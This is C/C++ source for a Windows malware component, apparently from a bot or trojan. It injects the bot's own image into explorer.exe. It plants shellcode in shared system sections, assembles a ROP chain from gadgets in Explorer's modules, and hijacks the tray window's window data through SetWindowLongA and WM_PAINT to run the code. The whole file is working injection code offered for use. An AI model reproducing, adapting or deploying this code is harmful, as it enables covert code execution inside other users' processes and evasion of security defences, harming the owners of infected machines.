#include "core\injects.h"
#include "core\pe.h"
#define PSAPI_VERSION 1
#include "psapi.h"
#include "..\hook\x86\zdisasm.h"
#include "core\debug.h"
#include "core\util.h"

#ifndef _WIN64

#define InitializeObjectAttributes( p, n, a, r, s ) {   \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

#define RtlOffsetToPointer(B,O) ((PCHAR)(((PCHAR)(B)) + ((ULONG_PTR)(O))))

typedef LONG (WINAPI *typeSetWindowLongA)( HWND hWnd, int nIndex, LONG dwNewLong );
typedef BOOL (WINAPI *typeSendNotifyMessageA)( HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam );

struct PARAM_DATA
{
	PVOID func;
	PVOID imageBase;
};

struct CODE_DATA
{
	BOOL (WINAPI *_CloseHandle)(HANDLE hObject);
	LPVOID (WINAPI *_MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
	HANDLE (WINAPI *_OpenFileMappingA)(DWORD dwDesiredAccess, BOOL bInheritHandle, char* lpName);
	HANDLE (WINAPI *_CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, PVOID lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
	LONG (WINAPI *_SetWindowLongA)(HWND hWnd, int nIndex, LONG dwNewLong);
	void (WINAPI *_OutputDebugStringA)( char* lpOutputString );

	BOOLEAN injectFlag;
	HWND wnd;
	LONG oldLong;
	PVOID injectNormalRoutine;
	PARAM_DATA param;
	char sectionName[32];
	char temp[3];
};

struct INJECT32_DATA
{
	DWORD ropCode[32];
	DWORD newLongVTable[8];
	CODE_DATA codeData;
	CHAR injectCode[0x100];
};

static VOID __declspec(naked) Inject32Start( CODE_DATA* data )
{
	__asm mov ebp, esp

	if (!data->injectFlag)
	{
		data->injectFlag = TRUE;

		HANDLE map;
		if( map = data->_OpenFileMappingA( FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, FALSE, data->sectionName ))
		{
			PVOID mapping;
			if( mapping = data->_MapViewOfFile( map, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0 ) )
			{
				data->param.imageBase = mapping;
				data->_CreateThread( NULL, 0, RtlOffsetToPointer( mapping, data->injectNormalRoutine ), &data->param, 0, NULL );
			}
			data->_CloseHandle(map);
		}
	}

	data->_SetWindowLongA( data->wnd, 0, data->oldLong );

	__asm
	{
		xor eax, eax
		add esp, 0x54
		pop ebp
		ret 0x10
	}

}

static VOID __declspec(naked) Inject32End()
{
}

//#pragma optimize("", on)

static PVOID GetKiUserApcDispatcherProc()
{
	//BYTE* procAddress = (BYTE*)API(KERNEL32, GetProcAddress)( API(KERNEL32, GetModuleHandleA)(_CS_("ntdll.dll")), _CS_("KiUserApcDispatcher") );
	BYTE* procAddress = (BYTE*)API(NTDLL, KiUserApcDispatcher);
	BYTE* address = procAddress;
	DWORD i = 0;

	while( *(BYTE*)address != 0x58 && *(WORD*)address != 0x7C8D && *(BYTE*)((DWORD)address + 2) != 0x24)
	{
		DWORD len;
		i++;
		GetInstLenght( (DWORD*)address, &len );
		address += len;
		if( i >= 0x14 ) return procAddress;
	}

	return address;
}

static DWORD CompareMemoryAndRead( HANDLE process, PVOID remoteAddress, SIZE_T remoteSize, PVOID memory, SIZE_T size)
{
	BYTE* local;
	DWORD rva = 0;
	SIZE_T t;

	if( local = (BYTE*)API(KERNEL32, VirtualAlloc)( NULL, remoteSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) )
	{
		if( API(KERNEL32, ReadProcessMemory)( process, remoteAddress, local, remoteSize, &t ) )
		{
			rva = Mem::IndexOf( local, remoteSize, memory, size );
			if( rva == (DWORD)-1 )
				rva = 0;
		}
		API(KERNEL32, VirtualFree)( local, 0, MEM_RELEASE );
	}
	return rva;
}

static PVOID FindCodeInProcessCode( HANDLE process, PVOID memory, SIZE_T size)
{
	PVOID ret = NULL;
	HMODULE *mods = (HMODULE*)Mem::Alloc(0x410);
	DWORD needed;

	if( mods )
	{
		if( API(PSAPI, EnumProcessModules)( process, mods, 0x410, &needed ) )
		{
			PVOID buffer = Mem::Alloc(0x400);

			if( buffer )
			{
				for( DWORD i = 0; i < (needed / sizeof(HMODULE)); i++ )
				{
					SIZE_T t;

					if( API(KERNEL32, ReadProcessMemory)( process, mods[i], buffer, 0x400, &t ) )
					{
						PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)API(NTDLL, RtlImageNtHeader)(buffer);
						if( ntHeaders )
						{
							PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

							for( WORD c = 0; c < ntHeaders->FileHeader.NumberOfSections; c++ )
							{
								if( !Str::Cmp( (PCHAR)section[c].Name, _CS_(".text") ) )
								{
									PVOID baseAddress = RtlOffsetToPointer( (PVOID)mods[i], (PVOID)section[c].VirtualAddress );
									DWORD rva = CompareMemoryAndRead( process, baseAddress, section[c].Misc.VirtualSize, memory, size );
									if( rva )
										ret = RtlOffsetToPointer( baseAddress, rva );
									break;
								}
							}
						}
					}
					if( ret ) break;
				}
				Mem::Free(buffer);
			}
		}
		Mem::Free(mods);
	}

	return ret;
}

static PVOID FindCodeInProcess( HANDLE process, PVOID memory, SIZE_T size )
{
	PVOID address = NULL;
	MEMORY_BASIC_INFORMATION info;
	DWORD rva;

	while( API(KERNEL32, VirtualQueryEx)( process, address, &info, sizeof(info) ) )
	{
		if( rva = CompareMemoryAndRead( process, address, info.RegionSize, memory, size ) )
			return RtlOffsetToPointer( info.AllocationBase, rva );

		address = RtlOffsetToPointer( address, info.RegionSize);
	}

	return NULL;
}

static bool Explore32CreateSH( INJECT32_DATA* ourMapInjectData, HANDLE process, INJECT32_DATA* remoteAddress, DWORD sizeOfShellCode)
{
	UCHAR firstSign[] = {0xB9, 0x94, 0x00, 0x00, 0x00, 0xF3, 0xA5, 0x5F, 0x33, 0xC0, 0x5E, 0x5D, 0xC2, 0x08, 0x00};
	UCHAR cldRetBytes[] = {0xFD, 0xC3};
	UCHAR stdRetBytes[] = {0xFC, 0xC3};
	UCHAR retBytes[] = {0x58, 0xC3};
	UCHAR jmpEaxBytes[] = {0xFF, 0xE0};

	ourMapInjectData->newLongVTable[0] = (DWORD)&remoteAddress->newLongVTable[5];
	ourMapInjectData->newLongVTable[5] = (DWORD)GetKiUserApcDispatcherProc();
	ourMapInjectData->newLongVTable[7] = (DWORD)FindCodeInProcessCode( process, cldRetBytes, sizeof(cldRetBytes) );
	ourMapInjectData->newLongVTable[6] = (DWORD)FindCodeInProcessCode( process, firstSign, sizeof(firstSign) );

	for( DWORD i = 0; i < 32; i++ ) ourMapInjectData->ropCode[i] = i;

	ourMapInjectData->ropCode[25] = (DWORD)FindCodeInProcessCode( process, stdRetBytes, sizeof(stdRetBytes) );
	ourMapInjectData->ropCode[28] = (DWORD)FindCodeInProcessCode( process, retBytes, sizeof(retBytes) );
	ourMapInjectData->ropCode[29] = 0x70;

	HMODULE ntdll = API(KERNEL32, GetModuleHandleA)(_CS_("ntdll.dll"));
	HMODULE kernel32 = API(KERNEL32, GetModuleHandleA)(_CS_("kernel32.dll"));
	ourMapInjectData->ropCode[30] = (DWORD)API(KERNEL32, GetProcAddress)( ntdll, _CS_("_chkstk") );
	ourMapInjectData->ropCode[31] = (DWORD)API(KERNEL32, GetProcAddress)( kernel32, _CS_("WriteProcessMemory") );
	ourMapInjectData->ropCode[5] = (DWORD)NtCurrentProcess();
	ourMapInjectData->ropCode[6] = (DWORD)API(KERNEL32, GetProcAddress)( ntdll, _CS_("atan") );
	ourMapInjectData->ropCode[7] = (DWORD)&remoteAddress->injectCode[0];
	ourMapInjectData->ropCode[8] = sizeOfShellCode;
	ourMapInjectData->ropCode[9] = (DWORD)&remoteAddress->ropCode[12];
	ourMapInjectData->ropCode[10] = ourMapInjectData->ropCode[6];	// eax = atan
	ourMapInjectData->ropCode[4] = ourMapInjectData->ropCode[28];	// pop eax, ret
	ourMapInjectData->ropCode[11] = (DWORD)FindCodeInProcessCode( process, jmpEaxBytes, sizeof(jmpEaxBytes) );
	ourMapInjectData->ropCode[14] = (DWORD)&remoteAddress->codeData;	

	return true;
}

static NTSTATUS OpenAndMapSection( PHANDLE phSection, PWCHAR nameSection, PVOID *address )
{
	UNICODE_STRING usNameSection;
	API(NTDLL, RtlInitUnicodeString)( &usNameSection, nameSection );

	OBJECT_ATTRIBUTES objAttr;
	//InitializeObjectAttributes( &objAttr, &usNameSection, OBJ_OPENIF, 0, 0 );
	objAttr.uLength = sizeof(OBJECT_ATTRIBUTES);
	objAttr.hRootDirectory = 0;
	objAttr.uAttributes = OBJ_OPENIF;
	objAttr.pObjectName = &usNameSection;
	objAttr.pSecurityDescriptor = 0;
	objAttr.pSecurityQualityOfService = 0;
	
	NTSTATUS st = API(NTDLL, NtOpenSection)( phSection, SECTION_MAP_READ | SECTION_MAP_WRITE, &objAttr );
	if( NT_SUCCESS(st) )
	{
		ULONG_PTR size = 0;
		st = API(NTDLL, NtMapViewOfSection)( *phSection, NtCurrentProcess(), address, 0, 0, NULL, &size, ViewUnmap, 0, PAGE_READWRITE);
		if( !NT_SUCCESS(st) ) API(NTDLL, NtClose)(*phSection);
	}

	return st;
}

static bool OpenSectionForInject(PHANDLE phSection, PVOID *address, ULONG *size)
{
	PWCHAR sections[] = {
		L"\\BaseNamedObjects\\ShimSharedMemory",
		L"\\BaseNamedObjects\\windows_shell_global_counters",
		L"\\BaseNamedObjects\\MSCTF.Shared.SFM.MIH",
		L"\\BaseNamedObjects\\MSCTF.Shared.SFM.AMF",
		L"\\BaseNamedObjects\\UrlZonesSM_Administrator",
		L"\\BaseNamedObjects\\UrlZonesSM_SYSTEM",
		0
	};

	for( int i = 0; sections[i]; i++ )
	{
		if( NT_SUCCESS( OpenAndMapSection( phSection, sections[i], address ) ) )
		{
			MEMORY_BASIC_INFORMATION info;

			API(KERNEL32, VirtualQuery)( *address, &info, sizeof(info) );
			*size = info.RegionSize;

			return true;
		}
	}

	return false;
}

static INJECT32_DATA* InjectExplore32CreateSH( DWORD pid, INJECT32_DATA* ourMapInjectData, DWORD sizeOfShellCodeWithData, DWORD sizeOfShellCode )
{
	INJECT32_DATA *ret = NULL, *remoteAddress = NULL;
	//DWORD pid = GetExplorerPid();

	if( pid )
	{
		HANDLE process = API(KERNEL32, OpenProcess)( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid );
		if( process != INVALID_HANDLE_VALUE )
		{
			if( remoteAddress = (INJECT32_DATA*)FindCodeInProcess( process, ourMapInjectData, sizeOfShellCodeWithData ) )
			{
				if( Explore32CreateSH( ourMapInjectData, process, remoteAddress, sizeOfShellCode ) )
				{
					ret = remoteAddress;
				}
			}

			API(KERNEL32, CloseHandle)(process);
		}
	}
	return ret;
}


static DWORD Inject32Normal( PARAM_DATA* param )
{
	PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)param->imageBase;
	PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((BYTE*)dh + dh->e_lfanew);
	DWORD imageSize = pe->OptionalHeader.SizeOfImage;
	ULONG relocRVA   = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	ULONG relocSize  = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
	PE::ProcessRelocs( (PIMAGE_BASE_RELOCATION)( (DWORD)param->imageBase + relocRVA ), (DWORD)param->imageBase, (DWORD)param->imageBase - pe->OptionalHeader.ImageBase, relocSize );	
	InitBot();
	HANDLE ev = API(KERNEL32, OpenEventA)( EVENT_MODIFY_STATE, FALSE, _CS_("inject32_event") );
	if( ev ) API(KERNEL32, SetEvent)(ev);
	DbgMsg( "NewInject to process is OK" );

	typeFuncThread func = (typeFuncThread)((DWORD)param->imageBase + (DWORD)param->func);
	func(0);
	return 0;
}

static bool InjectToProcess32( typeFuncThread func, DWORD pid, HWND wnd )
{
	bool ret = false;
	HANDLE sectionHandle;
	PVOID ourMapAddress = NULL;
	DWORD ourMapSize;
	if( OpenSectionForInject( &sectionHandle, &ourMapAddress, &ourMapSize ) )
	{
		int sizeOfShellCode = (DWORD)Inject32End - (DWORD)Inject32Start;
		if( sizeOfShellCode < 0 ) sizeOfShellCode = -sizeOfShellCode;

		DWORD sizeOfShellCodeWithData = sizeOfShellCode + sizeof(INJECT32_DATA);

		INJECT32_DATA* ourMapInjectData = (INJECT32_DATA*)(((DWORD)ourMapAddress + ourMapSize) - sizeOfShellCodeWithData); 
		Mem::Set( ourMapInjectData, 0, sizeOfShellCodeWithData );
		Mem::Copy( &ourMapInjectData->injectCode[0], Inject32Start, sizeOfShellCode);

		HMODULE kernel32 = API(KERNEL32, GetModuleHandleA)( _CS_("kernel32.dll") );
		HMODULE user32 = API(KERNEL32, GetModuleHandleA)( _CS_("user32.dll") );
		*(PVOID*)&ourMapInjectData->codeData._CloseHandle = API(KERNEL32, GetProcAddress)( kernel32, _CS_("CloseHandle") );
		*(PVOID*)&ourMapInjectData->codeData._MapViewOfFile = API(KERNEL32, GetProcAddress)( kernel32, _CS_("MapViewOfFile") );
		*(PVOID*)&ourMapInjectData->codeData._OpenFileMappingA = API(KERNEL32, GetProcAddress)( kernel32, _CS_("OpenFileMappingA") );
		*(PVOID*)&ourMapInjectData->codeData._CreateThread = API(KERNEL32, GetProcAddress)( kernel32, _CS_("CreateThread") );
		*(PVOID*)&ourMapInjectData->codeData._OutputDebugStringA = API(KERNEL32, GetProcAddress)( kernel32, _CS_("OutputDebugStringA") );
		*(PVOID*)&ourMapInjectData->codeData._SetWindowLongA = API(KERNEL32, GetProcAddress)( user32, _CS_("SetWindowLongA") );

		INJECT32_DATA* remoteShellCodeMap;
		if( remoteShellCodeMap = InjectExplore32CreateSH( pid, ourMapInjectData, sizeOfShellCodeWithData, sizeOfShellCode ) )
		{
			//HWND wnd = (HWND)pFindWindowA( "Shell_TrayWnd", NULL );
			LONG oldLong = API(USER32, GetWindowLongA)( wnd, 0 );

			if( wnd && oldLong )
			{
				ourMapInjectData->codeData.injectFlag = FALSE;
				ourMapInjectData->codeData.wnd = wnd;
				ourMapInjectData->codeData.oldLong = oldLong;
				
				DWORD imageBase = (DWORD)PE::GetImageBase();
				ourMapInjectData->codeData.injectNormalRoutine = (PVOID)((DWORD)Inject32Normal - imageBase);
				ourMapInjectData->codeData.param.func = (PVOID)((DWORD)func - imageBase);

				Str::Copy( ourMapInjectData->codeData.sectionName, _CS_("inject32_section") );
				ourMapInjectData->codeData.temp[0] = '1';
				ourMapInjectData->codeData.temp[1] = 0;

				PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)imageBase;
				PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((BYTE*)dh + dh->e_lfanew);
				DWORD imageSize = pe->OptionalHeader.SizeOfImage;
				HANDLE map = API(KERNEL32, CreateFileMappingA)( 0, NULL, PAGE_EXECUTE_READWRITE | SEC_COMMIT, 0, imageSize, ourMapInjectData->codeData.sectionName );
				if( map )
				{
					PVOID mapping = API(KERNEL32, MapViewOfFile)( map, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, 0 );
					if( mapping )
					{
						Mem::Copy( mapping, (void*)imageBase, imageSize );

						//восстанавливаем адрес по таблице релоков на основе ImageBase бота
						ULONG relocRVA   = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
						ULONG relocSize  = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
						PE::ProcessRelocs( (PIMAGE_BASE_RELOCATION)( imageBase + relocRVA ), (DWORD)mapping, pe->OptionalHeader.ImageBase - imageBase, relocSize );	
						HANDLE ev;
						if( ev = API(KERNEL32, CreateEventA)( NULL, 0, 0, _CS_("inject32_event") ) )
						{
							//ourMapInjectData->codeData._SetWindowLongA( wnd, 0, (LONG)&remoteShellCodeMap->newLongVTable[0] );
							//typeSendNotifyMessageA funcSendNotifyMessageA = (typeSendNotifyMessageA)API(KERNEL32, GetProcAddress)( user32, _CS_("SendNotifyMessageA") );
							//funcSendNotifyMessageA( wnd, WM_PAINT, 0, 0 );
							API(USER32, SetWindowLongA)( wnd, 0, (LONG)&remoteShellCodeMap->newLongVTable[0] );
							API(USER32, SendNotifyMessageA)( wnd, WM_PAINT, 0, 0 );
							if( API(USER32, WaitForSingleObject)( ev, 60000 ) )
								ret = true;
							API(KERNEL32, CloseHandle)(ev);
						}
						API(KERNEL32, UnmapViewOfFile)(mapping);
					}
				}
			}
		}
		API(NTDLL, NtUnmapViewOfSection)( NtCurrentProcess(), ourMapAddress );
		API(NTDLL, NtClose)(sectionHandle);
	}
	return ret;
}

#endif

bool InjectToExplorer32( typeFuncThread func )
{
#ifdef _WIN64
	return false;
#else
	DWORD pid = Process::GetExplorerPID();
	HWND wnd = API(USER32, FindWindowA)( _CS_("Shell_TrayWnd"), NULL );
	return InjectToProcess32( func, pid, wnd );
#endif
}
